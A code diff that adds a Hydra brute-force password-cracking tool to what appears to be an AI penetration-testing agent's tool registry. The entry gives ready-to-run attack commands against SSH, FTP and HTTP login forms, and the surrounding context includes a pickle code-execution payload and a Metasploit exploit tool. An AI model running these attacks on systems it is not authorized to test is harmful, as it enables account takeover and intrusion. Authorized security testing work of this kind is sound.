@@ -157,6 +157,34 @@ TOOL_REGISTRY = {
             '   - Example: code="import pickle,base64,os\\nclass E:\\n  def __reduce__(self):\\n    return(os.system,(\'id\',))\\nprint(base64.b64encode(pickle.dumps(E())).decode())"'
         ),
     },
+    "execute_hydra": {
+        "purpose": "Brute force password cracking (50+ protocols)",
+        "when_to_use": "Credential brute force attacks (SSH, FTP, SMB, RDP, HTTP, MySQL, etc.)",
+        "args_format": '"args": "hydra arguments without \'hydra\' prefix"',
+        "description": (
+            '**execute_hydra** (Brute Force Password Cracking)\n'
+            '   - THC Hydra — fast, parallelised network login cracker\n'
+            '   - Stateless: runs, reports found credentials, and exits\n'
+            '   - **50+ supported protocols:** ssh, ftp, rdp, smb, vnc, mysql, mssql, postgres,\n'
+            '     redis, mongodb, telnet, pop3, imap, smtp, http-get, http-post-form, and more\n'
+            '   - **Key flags:**\n'
+            '     - `-l USER` / `-L FILE` — single username / username list\n'
+            '     - `-p PASS` / `-P FILE` — single password / password list\n'
+            '     - `-C FILE` — colon-separated `user:pass` combo file\n'
+            '     - `-e nsr` — try null password (n), login-as-pass (s), reversed login (r)\n'
+            '     - `-t TASKS` — parallel connections (default 16; SSH max 4, RDP max 1)\n'
+            '     - `-f` — stop on first valid credential found\n'
+            '     - `-s PORT` — non-default port\n'
+            '     - `-S` — use SSL/TLS\n'
+            '     - `-V` — verbose (show each attempt)\n'
+            '   - **Syntax:** `[flags] protocol://target[:port]`\n'
+            '   - **HTTP POST Form special syntax:** `[flags] target http-post-form "/path:params:F=failure_string"`\n'
+            '     - Use `^USER^` and `^PASS^` as placeholders in form params\n'
+            '   - Example: "-l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 -f -e nsr -V ssh://10.0.0.5"\n'
+            '   - Example: "-l admin -P passwords.txt -f -V ftp://10.0.0.5"\n'
+            '   - Example: "-l admin -P passwords.txt -f -V 10.0.0.5 http-post-form \\"/login:user=^USER^&pass=^PASS^:F=Invalid\\""'
+        ),
+    },
     "metasploit_console": {
         "purpose": "Exploit execution",
         "when_to_use": "Execute exploits, manage sessions",
